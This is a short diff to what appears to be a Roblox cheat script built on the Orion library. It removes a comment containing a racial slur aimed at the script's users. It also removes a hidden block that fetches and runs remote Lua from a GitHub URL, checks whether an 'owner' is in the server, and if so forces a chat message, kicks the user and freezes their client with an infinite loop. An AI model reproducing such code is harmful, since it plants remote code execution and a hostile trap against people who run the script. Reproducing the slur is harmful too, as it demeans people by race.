@@ -1,29 +1,5 @@
 -- hell yea
 
--- fucking niggers using my script when im in the server xd
-
-    local owners = loadstring(game:HttpGet("https://raw.githubusercontent.com/AndrewDarkyy/NOWAY/main/sussy.lua"))()
-
-    for _,v in next, game.Players:GetChildren() do
-        if v ~= game.Players.LocalPlayer and table.find(owners, v.UserId) then
-            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i wanna say setreadonly", "All")
-            wait(3)
-            game.Players.LocalPlayer:Kick("DarkyyWare's Owner Joined Your Server please press leave or ur microsoft store will be closed!")
-            wait(3)
-            while true do end
-        end
-    end
-
-    game.Players.PlayerAdded:Connect(function(v)
-        if v ~= game.Players.LocalPlayer and table.find(owners, v.UserId) then
-            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i wanna say setreadonly", "All")
-            wait(3)
-            game.Players.LocalPlayer:Kick("DarkyyWare's Owner Joined Your Server please press leave or ur microsoft store will be closed!")
-            wait(3)
-            while true do end
-        end
-    end)
-
 
 -- this is just orion lib so yea :)
 
